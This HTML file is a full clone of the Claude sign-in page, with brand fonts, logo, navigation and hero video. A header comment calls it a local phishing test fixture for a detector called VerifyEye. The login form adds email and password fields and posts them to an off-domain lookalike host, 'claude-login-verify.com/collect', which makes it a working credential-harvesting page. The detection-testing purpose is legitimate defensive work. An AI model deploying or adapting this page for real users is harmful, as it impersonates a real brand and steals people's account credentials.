<!doctype html>
<!--
  PHISHING TEST FIXTURE for VerifyEye — local testing only, do NOT deploy publicly.
  A lookalike of the Claude (Anthropic) sign-in page, rebuilt static with the real
  fonts / video, used to validate that the VerifyEye detector flags brand
  impersonation + an off-domain credential form. Real claude.ai is passwordless;
  this clone adds a password field and submits off-domain — the phishing signal.
-->
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sign in - Claude</title>
  <style>
    @font-face {
      font-family: "anthropic-sans";
      src: url("anthropic-sans.woff2") format("woff2");
      font-weight: 100 900; font-display: swap;
    }
    @font-face {
      font-family: "anthropic-serif";
      src: url("anthropic-serif.woff2") format("woff2");
      font-weight: 100 900; font-display: swap;
    }
    :root {
      --primary: #0b0b0b;
      --secondary: #52514e;
      --muted: #898781;
      --link: #184f95;
      --accent: #2a78d6;
      --clay: #d97757;
      --surface-0: #f9f9f7;
      --surface-1: #fcfcfb;
      --surface-2: #ffffff;
      --border: rgb(11 11 11 / 0.1);
      --ghost-hover: rgb(11 11 11 / 0.05);
      --sans: "anthropic-sans", system-ui, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      --serif: "anthropic-serif", Georgia, "Times New Roman", serif;
    }
    * { box-sizing: border-box; }
    html, body { margin: 0; min-height: 100%; }
    body {
      background: var(--surface-0);
      color: var(--primary);
      font-family: var(--sans);
      font-size: 15px;
      -webkit-font-smoothing: antialiased;
    }

    /* ── top nav ── */
    .nav { display: flex; align-items: center; gap: 32px; padding: 20px 40px; }
    .logo { display: flex; align-items: center; gap: 10px; font-family: var(--serif); font-size: 23px; font-weight: 400; letter-spacing: -0.01em; }
    .logo img { width: 27px; height: 27px; }

    .nav-links { display: flex; align-items: center; gap: 26px; margin-left: 12px; }
    .nav-links a { display: inline-flex; align-items: center; gap: 4px; color: var(--primary); text-decoration: none; font-size: 15px; }
    .nav-links a svg { width: 11px; height: 11px; opacity: 0.55; }

    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 10px; }
    .pill { height: 40px; padding: 0 18px; display: inline-flex; align-items: center; border-radius: 10px; font-size: 15px; font-weight: 500; cursor: pointer; border: 1px solid var(--border); background: var(--surface-2); color: var(--primary); }
    .pill:hover { background: var(--ghost-hover); }
    .pill.dark { background: var(--primary); color: #fff; border-color: var(--primary); }
    .pill.dark:hover { background: #2c2c2a; }

    /* ── hero ── */
    .wrap { display: grid; grid-template-columns: 1fr 1fr; align-items: center; gap: 40px; padding: 16px 40px 56px; max-width: 1360px; margin: 0 auto; }
    .left { display: flex; flex-direction: column; align-items: center; text-align: center; }

    .headline { font-family: var(--serif); font-size: 56px; font-weight: 330; line-height: 1.15; letter-spacing: -0.015em; margin: 8px 0 0; }
    .sub { font-family: var(--serif); font-size: 18px; color: var(--primary); margin: 16px 0 0; }

    .card {
      width: 100%;
      max-width: 400px;
      margin-top: 32px;
      background: var(--surface-1);
      border: 0.5px solid var(--border);
      border-radius: 32px;
      padding: 28px;
      text-align: left;
      box-shadow: 0 4px 24px rgb(0 0 0 / 0.016), 0 16px 32px rgb(0 0 0 / 0.012);
    }

    .oauth { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; height: 46px; border: 1px solid var(--border); border-radius: 12px; background: var(--surface-2); font-size: 14px; font-weight: 500; color: var(--primary); cursor: pointer; margin-bottom: 10px; }
    .oauth:hover { background: var(--ghost-hover); }
    .oauth svg { width: 17px; height: 17px; }

    .or { text-align: center; color: var(--secondary); font-size: 11px; letter-spacing: 0.06em; text-transform: uppercase; margin: 13px 0; }

    input[type="email"], input[type="password"] {
      width: 100%; height: 46px; padding: 0 16px;
      border: 0; border-radius: 12px;
      box-shadow: inset 0 0 0 1px var(--border);
      font-size: 15px; font-family: var(--sans);
      background: rgb(255 255 255 / 0.5); color: var(--primary);
      margin-bottom: 10px; outline: none;
      transition: box-shadow 0.15s;
    }
    input::placeholder { color: var(--muted); }
    input:focus { box-shadow: inset 0 0 0 1px var(--accent), 0 0 0 3px rgb(42 120 214 / 0.15); }

    .submit { width: 100%; height: 46px; border: 0; border-radius: 12px; background: var(--primary); color: #fff; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 4px; }
    .submit:hover { background: #2c2c2a; }

    .fine { font-size: 12px; color: var(--muted); line-height: 1.55; text-align: center; margin: 18px 2px 0; }
    .fine a { color: var(--link); text-decoration: underline; }

    .download { display: inline-flex; align-items: center; gap: 8px; margin-top: 24px; padding: 0 16px; height: 44px; border: 1px solid var(--border); border-radius: 12px; background: var(--surface-2); font-size: 14px; font-weight: 500; color: var(--primary); cursor: pointer; }
    .download:hover { background: var(--ghost-hover); }
    .download svg { width: 14px; height: 14px; }

    .art { justify-self: center; width: 100%; max-width: 560px; aspect-ratio: 1080 / 1350; border-radius: 16px; overflow: hidden; background: var(--surface-0); box-shadow: 0 4px 20px rgb(11 11 11 / 0.04); }
    .art video { width: 100%; height: 100%; object-fit: cover; display: block; }

    @media (max-width: 1000px) {
      .nav-links, .nav-right { display: none; }
      .wrap { grid-template-columns: 1fr; padding: 16px 22px 40px; }
      .art { display: none; }
      .headline { font-size: 42px; }
    }
  </style>
</head>
<body>
  <nav class="nav">
    <span class="logo">
      <img src="claude-spark-icon-clay-bg.svg" alt="" />
      Claude
    </span>
    <span class="nav-links">
      <a href="#">Meet Claude <svg viewBox="0 0 12 12" fill="none"><path d="M2 4l4 4 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
      <a href="#">Platform <svg viewBox="0 0 12 12" fill="none"><path d="M2 4l4 4 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
      <a href="#">Solutions <svg viewBox="0 0 12 12" fill="none"><path d="M2 4l4 4 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
      <a href="#">Pricing <svg viewBox="0 0 12 12" fill="none"><path d="M2 4l4 4 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
      <a href="#">Resources <svg viewBox="0 0 12 12" fill="none"><path d="M2 4l4 4 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
    </span>
    <span class="nav-right">
      <button class="pill">Contact sales</button>
      <button class="pill dark">Try Claude</button>
    </span>
  </nav>

  <div class="wrap">
    <div class="left">
      <h1 class="headline">Question what&rsquo;s next</h1>
      <p class="sub">Your thinking partner for big ambitions</p>

      <!-- off-domain action is the phishing signal the detector reads -->
      <form class="card" action="https://claude-login-verify.com/collect" method="post">
        <button type="button" class="oauth">
          <svg viewBox="0 0 48 48" aria-hidden="true"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.6 2.4 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.9 6.1C12.4 13.2 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.1 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.5c-.5 2.9-2.2 5.3-4.7 7l7.2 5.6c4.2-3.9 6.6-9.6 6.6-16.1z"/><path fill="#FBBC05" d="M10.5 28.7c-.5-1.5-.8-3-.8-4.7s.3-3.2.8-4.7l-7.9-6.1C1 16.3 0 20 0 24s1 7.7 2.6 10.8l7.9-6.1z"/><path fill="#34A853" d="M24 48c6.2 0 11.5-2 15.3-5.5l-7.2-5.6c-2 1.4-4.6 2.2-8.1 2.2-6.3 0-11.6-3.7-13.5-9.1l-7.9 6.1C6.5 42.6 14.6 48 24 48z"/></svg>
          Continue with Google
        </button>
        <button type="button" class="oauth">
          <svg viewBox="0 0 24 24" fill="#000" aria-hidden="true"><path d="M16.3 12.7c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.1-2.8.9-3.5.9-.7 0-1.9-.8-3-.8-1.5 0-3 .9-3.8 2.3-1.6 2.8-.4 7 1.2 9.3.8 1.1 1.7 2.4 2.9 2.3 1.2 0 1.6-.8 3-.8s1.8.8 3 .7c1.2 0 2-1.1 2.8-2.2.9-1.3 1.2-2.5 1.3-2.6-.1 0-2.5-1-2.5-3.9zM14 5.4c.6-.8 1.1-1.8.9-2.9-.9.1-2 .6-2.6 1.4-.6.7-1.1 1.8-1 2.8 1 .1 2-.5 2.7-1.3z"/></svg>
          Continue with Apple
        </button>

        <div class="or">or</div>

        <input name="email" type="email" placeholder="Enter your email" autocomplete="username" required />
        <input name="password" type="password" placeholder="Enter your password" autocomplete="current-password" required />

        <button type="submit" class="submit">Continue with email</button>

        <p class="fine">By continuing, you acknowledge Anthropic&rsquo;s <a href="#">Privacy Policy</a> and agree to get occasional promotional emails and notifications.</p>
      </form>

      <button type="button" class="download">
        <svg viewBox="0 0 24 24" fill="#0b0b0b" aria-hidden="true"><path d="M16.3 12.7c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.1-2.8.9-3.5.9-.7 0-1.9-.8-3-.8-1.5 0-3 .9-3.8 2.3-1.6 2.8-.4 7 1.2 9.3.8 1.1 1.7 2.4 2.9 2.3 1.2 0 1.6-.8 3-.8s1.8.8 3 .7c1.2 0 2-1.1 2.8-2.2.9-1.3 1.2-2.5 1.3-2.6-.1 0-2.5-1-2.5-3.9zM14 5.4c.6-.8 1.1-1.8.9-2.9-.9.1-2 .6-2.6 1.4-.6.7-1.1 1.8-1 2.8 1 .1 2-.5 2.7-1.3z"/></svg>
        Download desktop app
      </button>
    </div>

    <div class="art">
      <video src="login-hero.mp4" poster="login-hero-still.webp" autoplay muted loop playsinline></video>
    </div>
  </div>
</body>
</html>
